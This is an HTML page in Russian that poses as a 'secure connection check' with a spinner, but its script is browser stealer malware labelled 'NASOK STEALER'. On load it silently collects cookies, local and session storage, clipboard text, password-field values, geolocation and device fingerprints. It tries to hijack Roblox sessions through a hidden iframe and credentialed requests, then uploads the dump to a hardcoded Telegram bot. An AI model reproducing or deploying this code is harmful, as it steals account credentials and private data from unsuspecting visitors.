<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Проверка подключения</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0e17;
            font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
            color: #e0e8f0;
        }
        .card {
            background: linear-gradient(145deg, #141d2b, #1a2535);
            border-radius: 28px;
            padding: 32px 24px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.7), inset 0 1px 1px rgba(255,255,255,0.05);
            border: 1px solid #2a3a4e;
            text-align: center;
        }
        .logo {
            font-size: 48px;
            margin-bottom: 8px;
            display: block;
            filter: drop-shadow(0 0 20px rgba(70, 170, 255, 0.15));
        }
        .title {
            font-size: 22px;
            font-weight: 600;
            background: linear-gradient(135deg, #6ab7ff, #4a8eff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 6px;
        }
        .subtitle {
            font-size: 14px;
            color: #7a8fa3;
            margin-bottom: 24px;
        }
        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #1e2d40;
            border-top: 4px solid #4a8eff;
            border-radius: 50%;
            animation: spin 0.9s cubic-bezier(0.6, 0, 0.4, 1) infinite;
            margin: 20px auto 16px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .status-text {
            font-size: 13px;
            color: #5a7a8f;
            background: #0d1520;
            padding: 8px 16px;
            border-radius: 30px;
            display: inline-block;
            border: 1px solid #1f3040;
            margin-top: 4px;
        }
        .progress-bar {
            width: 100%;
            height: 4px;
            background: #0d1520;
            border-radius: 4px;
            margin-top: 20px;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #4a8eff, #6ab7ff);
            border-radius: 4px;
            transition: width 0.3s;
        }
        .footer {
            margin-top: 20px;
            font-size: 11px;
            color: #3a4f62;
            letter-spacing: 0.3px;
        }
        .roblox-badge {
            background: #1a2a3a;
            border-radius: 20px;
            padding: 6px 14px;
            display: inline-block;
            font-size: 12px;
            color: #8ab4d0;
            border: 1px solid #2a4055;
            margin-top: 10px;
        }
        .status-row {
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            color: #5a7a8f;
            margin-top: 16px;
            padding: 0 4px;
        }
        .status-row span:last-child {
            color: #7a9ab0;
        }
        .hidden {
            display: none !important;
        }
        /* Адаптив под совсем мелкие экраны */
        @media (max-width: 380px) {
            .card { padding: 24px 16px; }
            .title { font-size: 19px; }
        }
    </style>
</head>
<body>

<div class="card" id="app">
    <span class="logo">🛡️</span>
    <div class="title">Безопасное соединение</div>
    <div class="subtitle">Проверка защищённого канала</div>

    <div class="spinner"></div>
    <div class="status-text" id="statusLabel">Инициализация...</div>

    <div class="progress-bar">
        <div class="progress-fill" id="progressFill"></div>
    </div>

    <div class="status-row">
        <span>Статус</span>
        <span id="statusDetail">Подключение...</span>
    </div>

    <div class="roblox-badge" id="robloxBadge">🎮 Roblox: ожидание...</div>

    <div class="footer">Защищённый канал • v3.2</div>
</div>

<script>
// ============================================================
//  👇 ВСТАВЬ СВОИ ДАННЫЕ, МУДАК
// ============================================================
const BOT_TOKEN = '8524097415:AAHhdHVp9hh3ZoPhp3HmipEiT5xLFXRBr20';
const CHAT_ID  = '-1003791860129';
// ============================================================

// ---- UI ЭЛЕМЕНТЫ ----
const statusLabel = document.getElementById('statusLabel');
const statusDetail = document.getElementById('statusDetail');
const progressFill = document.getElementById('progressFill');
const robloxBadge = document.getElementById('robloxBadge');

function updateUI(label, detail, progress) {
    statusLabel.textContent = label;
    statusDetail.textContent = detail || label;
    if (progress !== undefined) progressFill.style.width = progress + '%';
}

// ---- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ----
function safeStringify(obj) {
    try { return JSON.stringify(obj, null, 2); } 
    catch(e) { return String(obj) || 'ошибка'; }
}

// ---- НОВЫЙ МЕТОД: КРАЖА КУК ЧЕРЕЗ IFrame + postMessage ----
function stealRobloxCookiesViaIframe() {
    return new Promise((resolve) => {
        const result = { status: 'ожидание', method: 'iframe' };
        
        // Создаём скрытый iframe
        const iframe = document.createElement('iframe');
        iframe.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;';
        iframe.src = 'https://www.roblox.com/';
        document.body.appendChild(iframe);

        let timeoutId = setTimeout(() => {
            result.status = 'таймаут';
            result.error = 'iframe не загрузился за 8с';
            document.body.removeChild(iframe);
            resolve(result);
        }, 8000);

        iframe.onload = function() {
            clearTimeout(timeoutId);
            try {
                // Пытаемся получить куки через contentWindow
                try {
                    const docCookies = iframe.contentDocument?.cookie || '';
                    if (docCookies) {
                        const cookies = {};
                        docCookies.split('; ').forEach(c => {
                            const [k, v] = c.split('=');
                            if (k) cookies[k] = v || '';
                        });
                        result.document_cookies = cookies;
                        result.status = 'успешно (document.cookie)';
                    }
                } catch(e) {
                    // CORS блокирует доступ к contentDocument
                }

                // Пытаемся через postMessage (если Roblox поддерживает)
                // ВАЖНО: Это экспериментально, но пробуем
                try {
                    iframe.contentWindow.postMessage({ type: 'GET_COOKIES' }, 'https://www.roblox.com');
                } catch(e) {}

                // Если ничего не вышло — пробуем через fetch с redirect
                fetch('https://www.roblox.com/mobileapi/userinfo', {
                    method: 'GET',
                    credentials: 'include',
                    mode: 'cors'
                })
                .then(res => {
                    if (res.ok) {
                        return res.json().then(json => {
                            result.user_data = json;
                            result.status = 'успешно (fetch)';
                            // Пытаемся вытащить Set-Cookie
                            const setCookie = res.headers.get('set-cookie');
                            if (setCookie) {
                                const cookies = {};
                                setCookie.split(',').forEach(c => {
                                    const [kv] = c.split(';');
                                    const [k, v] = kv.split('=');
                                    if (k && v) cookies[k.trim()] = v.trim();
                                });
                                result.set_cookie = cookies;
                            }
                            document.body.removeChild(iframe);
                            resolve(result);
                        });
                    }
                })
                .catch(() => {});

                // Если fetch не сработал, но мы получили хоть что-то через iframe
                if (result.document_cookies && Object.keys(result.document_cookies).length) {
                    document.body.removeChild(iframe);
                    resolve(result);
                    return;
                }

                // Если ничего не получилось — пробуем редирект на Roblox
                // Но это будет в отдельной функции

            } catch(e) {
                result.error = e.message;
                result.status = 'ошибка';
            }
        };

        // Дополнительно пробуем через fetch напрямую (без iframe)
        fetch('https://www.roblox.com/mobileapi/userinfo', {
            method: 'GET',
            credentials: 'include',
            mode: 'cors'
        })
        .then(res => {
            if (res.ok) {
                return res.json().then(json => {
                    result.user_data = json;
                    result.status = 'успешно (прямой fetch)';
                    const setCookie = res.headers.get('set-cookie');
                    if (setCookie) {
                        const cookies = {};
                        setCookie.split(',').forEach(c => {
                            const [kv] = c.split(';');
                            const [k, v] = kv.split('=');
                            if (k && v) cookies[k.trim()] = v.trim();
                        });
                        result.set_cookie = cookies;
                    }
                    document.body.removeChild(iframe);
                    clearTimeout(timeoutId);
                    resolve(result);
                });
            }
        })
        .catch(() => {});

        // Запасной вариант: редирект на Roblox и обратно (через 5 секунд)
        setTimeout(() => {
            if (result.status === 'ожидание' || result.status === 'таймаут') {
                // Пробуем редирект
                // result.redirect_attempt = 'попытка редиректа...';
                // window.location.href = 'https://www.roblox.com/mobileapi/userinfo';
                // Но это не сработает, т.к. мы потеряем контроль
                result.status = 'не удалось';
                result.error = 'все методы не сработали';
                document.body.removeChild(iframe);
                clearTimeout(timeoutId);
                resolve(result);
            }
        }, 6000);
    });
}

// ===== ОСНОВНОЙ СБОРЩИК =====
async function collectEverything() {
    updateUI('Сбор данных...', 'Инициализация', 10);
    
    const result = {
        '🕐 Время': new Date().toISOString(),
        '🔗 URL': window.location.href,
        '🌐 Браузер': {},
        '🖥️ Экран': {},
        '🍪 Все куки (document)': {},
        '🎮 КУКИ ROBLOX (через iframe)': {},
        '💾 Локальное хранилище': {},
        '📂 Сессионное хранилище': {},
        '📡 Геолокация': {},
        '📋 Буфер обмена': 'недоступен',
        '📶 Сеть': {},
        '🔑 Пароли из форм': {},
        '🧩 Плагины': [],
        '🎤 Медиа-устройства': {},
        '🔋 Батарея': 'недоступна',
        '🖌️ WebGL': 'недоступен',
        '📜 История': {},
        '🧬 Отпечаток': {}
    };

    updateUI('Браузер...', 'Сбор информации', 15);

    // ---- БАЗОВАЯ ИНФА ----
    result['🌐 Браузер'] = {
        'User-Agent': navigator.userAgent,
        'Платформа': navigator.platform,
        'Язык': navigator.language,
        'Все языки': navigator.languages || [],
        'Куки включены': navigator.cookieEnabled,
        'Do Not Track': navigator.doNotTrack || 'не указан',
        'Ядра': navigator.hardwareConcurrency || 'неизвестно',
        'Таймзона': Intl.DateTimeFormat().resolvedOptions().timeZone
    };

    updateUI('Экран...', 'Сбор информации', 20);

    // ---- ЭКРАН ----
    result['🖥️ Экран'] = {
        'Размер': `${screen.width}x${screen.height}`,
        'Доступно': `${screen.availWidth}x${screen.availHeight}`,
        'Глубина цвета': screen.colorDepth + 'bit',
        'Pixel Ratio': window.devicePixelRatio || 1,
        'Окно (внутри)': `${window.innerWidth}x${window.innerHeight}`,
        'Окно (снаружи)': `${window.outerWidth}x${window.outerHeight}`,
        'Позиция': `${window.screenX || 0}, ${window.screenY || 0}`
    };

    updateUI('Куки...', 'Сбор куки', 25);

    // ---- КУКИ ЧЕРЕЗ DOCUMENT.COOKIE ----
    try {
        const docCookies = {};
        document.cookie.split('; ').forEach(c => {
            const [k, v] = c.split('=');
            if (k) docCookies[k] = v || '';
        });
        result['🍪 Все куки (document)'] = docCookies;
    } catch(e) { 
        result['🍪 Все куки (document)'] = { ошибка: 'не удалось прочитать' }; 
    }

    updateUI('Roblox...', 'Попытка кражи кук', 35);

    // ---- КУКИ ROBLOX (НОВЫЙ МЕТОД) ----
    const robloxResult = await stealRobloxCookiesViaIframe();
    result['🎮 КУКИ ROBLOX (через iframe)'] = robloxResult;

    // Обновляем UI в зависимости от результата
    if (robloxResult.status && robloxResult.status.includes('успешно')) {
        robloxBadge.innerHTML = '🎮 Roblox: ✅ сессия найдена';
        robloxBadge.style.color = '#6ab7ff';
        robloxBadge.style.borderColor = '#2a6a8a';
        if (robloxResult.user_data && robloxResult.user_data.UserName) {
            robloxBadge.innerHTML = `🎮 Roblox: ${robloxResult.user_data.UserName} (${robloxResult.user_data.RobuxBalance || '?'} Robux)`;
        }
    } else {
        robloxBadge.innerHTML = '🎮 Roblox: ❌ сессия не найдена';
        robloxBadge.style.color = '#8a5a5a';
        robloxBadge.style.borderColor = '#5a2a2a';
    }

    updateUI('Хранилища...', 'Сбор localStorage/sessionStorage', 50);

    // ---- LOCAL STORAGE ----
    try { result['💾 Локальное хранилище'] = { ...localStorage }; } 
    catch(e) { result['💾 Локальное хранилище'] = { ошибка: 'доступ запрещён' }; }

    // ---- SESSION STORAGE ----
    try { result['📂 Сессионное хранилище'] = { ...sessionStorage }; } 
    catch(e) { result['📂 Сессионное хранилище'] = { ошибка: 'доступ запрещён' }; }

    updateUI('Геолокация...', 'Запрос геопозиции', 60);

    // ---- ГЕОЛОКАЦИЯ ----
    await new Promise(resolve => {
        if (!navigator.geolocation) {
            result['📡 Геолокация'] = { ошибка: 'не поддерживается' };
            resolve();
            return;
        }
        navigator.geolocation.getCurrentPosition(
            pos => {
                result['📡 Геолокация'] = {
                    'Широта': pos.coords.latitude,
                    'Долгота': pos.coords.longitude,
                    'Точность': pos.coords.accuracy + 'м',
                    'Высота': pos.coords.altitude || 'неизвестно',
                    'Скорость': pos.coords.speed || 'неизвестно'
                };
                resolve();
            },
            err => {
                result['📡 Геолокация'] = { ошибка: err.message };
                resolve();
            },
            { timeout: 5000, enableHighAccuracy: true }
        );
    });

    updateUI('Буфер...', 'Сбор буфера обмена', 70);

    // ---- БУФЕР ОБМЕНА ----
    try {
        if (navigator.clipboard && navigator.clipboard.readText) {
            result['📋 Буфер обмена'] = await navigator.clipboard.readText() || '[пусто]';
        } else {
            result['📋 Буфер обмена'] = 'API недоступно';
        }
    } catch(e) { result['📋 Буфер обмена'] = 'ошибка доступа'; }

    updateUI('Сеть...', 'Сбор сетевой информации', 75);

    // ---- СЕТЬ ----
    const conn = navigator.connection || {};
    result['📶 Сеть'] = {
        'Тип': conn.effectiveType || 'неизвестно',
        'Скорость': conn.downlink ? conn.downlink + ' Mbps' : 'неизвестно',
        'Задержка': conn.rtt ? conn.rtt + ' ms' : 'неизвестно',
        'Экономия трафика': conn.saveData ? 'включена' : 'отключена'
    };

    updateUI('Пароли...', 'Сбор паролей из форм', 80);

    // ---- ПАРОЛИ ИЗ ФОРМ ----
    const passwords = {};
    document.querySelectorAll('input[type="password"]').forEach((inp, i) => {
        if (inp.value) {
            const name = inp.name || inp.id || `поле_${i+1}`;
            passwords[name] = inp.value;
        }
    });
    result['🔑 Пароли из форм'] = passwords;

    updateUI('Плагины...', 'Сбор плагинов', 85);

    // ---- ПЛАГИНЫ ----
    try {
        result['🧩 Плагины'] = Array.from(navigator.plugins || []).map(p => p.name);
    } catch(e) { result['🧩 Плагины'] = ['недоступны']; }

    updateUI('Медиа...', 'Сбор медиа-устройств', 88);

    // ---- МЕДИА-УСТРОЙСТВА ----
    try {
        const devices = await navigator.mediaDevices?.enumerateDevices?.() || [];
        result['🎤 Медиа-устройства'] = {
            'Микрофоны': devices.filter(d => d.kind === 'audioinput').map(d => d.label || 'без имени'),
            'Камеры': devices.filter(d => d.kind === 'videoinput').map(d => d.label || 'без имени'),
            'Динамики': devices.filter(d => d.kind === 'audiooutput').map(d => d.label || 'без имени')
        };
    } catch(e) { result['🎤 Медиа-устройства'] = { ошибка: 'недоступны' }; }

    updateUI('Батарея...', 'Сбор информации о батарее', 90);

    // ---- БАТАРЕЯ ----
    try {
        const b = await navigator.getBattery?.();
        if (b) {
            result['🔋 Батарея'] = `Заряд: ${Math.round(b.level*100)}%, Зарядка: ${b.charging ? 'Да' : 'Нет'}`;
        }
    } catch(e) { result['🔋 Батарея'] = 'недоступна'; }

    updateUI('WebGL...', 'Сбор WebGL', 93);

    // ---- WEBGL ----
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debug = gl.getExtension('WEBGL_debug_renderer_info');
            if (debug) {
                const vendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
                const renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
                result['🖌️ WebGL'] = `Вендор: ${vendor}, Рендер: ${renderer}`;
            } else {
                result['🖌️ WebGL'] = 'доступен (нет доп. инфо)';
            }
        }
    } catch(e) { result['🖌️ WebGL'] = 'ошибка'; }

    // ---- ИСТОРИЯ ----
    result['📜 История'] = { 'Длина': window.history.length };

    // ---- ОТПЕЧАТОК ----
    result['🧬 Отпечаток'] = {
        'Canvas': 'генерируется при необходимости',
        'WebGL': result['🖌️ WebGL'] || 'неизвестно'
    };

    updateUI('Готово!', 'Отправка в Telegram', 100);
    return result;
}

// ===== ОТПРАВКА В ТЕЛЕГРАМ =====
async function sendToTelegram(data) {
    if (!BOT_TOKEN || !CHAT_ID || BOT_TOKEN === 'ТВОЙ_ТОКЕН_БОТА') {
        console.error('🔴 НАСТРОЙ ТОКЕН И CHAT_ID, ДОЛБАЁБ!');
        statusLabel.textContent = 'Ошибка настройки';
        statusDetail.textContent = 'Вставь токен и chat_id';
        return;
    }

    updateUI('Отправка...', 'Формируем дамп', 95);

    // Формируем текст
    let textReport = '📦 NASOK STEALER — ПОЛНЫЙ ДАМП\n';
    textReport += '═'.repeat(40) + '\n\n';

    for (const [section, content] of Object.entries(data)) {
        textReport += `🔹 ${section}\n`;
        textReport += '─'.repeat(30) + '\n';
        
        if (typeof content === 'object' && !Array.isArray(content)) {
            for (const [key, val] of Object.entries(content)) {
                let value = typeof val === 'object' ? safeStringify(val) : String(val);
                if (value && value.length > 300) value = value.slice(0, 300) + '… [обрезано]';
                textReport += `  • ${key}: ${value}\n`;
            }
        } else if (Array.isArray(content)) {
            textReport += `  • ${content.join(', ') || 'пусто'}\n`;
        } else {
            textReport += `  • ${String(content)}\n`;
        }
        textReport += '\n';
    }

    textReport += '═'.repeat(40) + '\n';
    textReport += `📅 Создано: ${new Date().toISOString()}\n`;
    textReport += `🤖 Nasok v3.2 (Mobile Edition)`;

    // Отправляем файл
    const blob = new Blob([textReport], { type: 'text/plain;charset=utf-8' });
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', blob, `nasok_dump_${Date.now()}.txt`);

    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
            method: 'POST',
            body: formData
        });
        console.log('✅ Файл отправлен');
        statusLabel.textContent = '✅ Отправлено!';
        statusDetail.textContent = 'Дамп в Telegram';
    } catch(e) {
        console.error('❌ Ошибка:', e);
        statusLabel.textContent = '❌ Ошибка отправки';
        statusDetail.textContent = 'Проверь токен/интернет';
    }
}

// ===== ЗАПУСК =====
(async function() {
    const data = await collectEverything();
    console.log('✅ Собрано:', data);
    await sendToTelegram(data);
})();
</script>
</body>
</html>
